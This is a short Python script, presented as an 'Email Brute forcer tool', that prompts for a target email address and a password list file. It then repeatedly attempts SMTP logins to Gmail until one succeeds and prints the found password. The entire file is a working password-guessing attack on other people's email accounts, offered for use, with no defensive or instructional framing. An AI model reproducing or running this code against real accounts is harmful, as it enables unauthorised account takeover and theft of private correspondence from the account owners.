#!/usr/bin/env python
import smtplib
print("                             ")
print("\t#################################################")
print("\t#         Welcome to Email Brute forcer tool    #")
print("\t#          Created by @ashujaiswal109           #")
print("\t#################################################")
print("                             ")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter target email id: ")
print("                                   ")
passwf = raw_input("Enter password file: ")
print("                                   ")
passwf = open(passwf, "r")

for password in passwf:
    try:
        smtpserver.login(user, password)
        print("Voila! password found: %s" % password)
        print("                                   ")
        break
    except smtplib.SMTPAuthenticationError:
        print(" password not found %s" % password)
        print("                                   ")





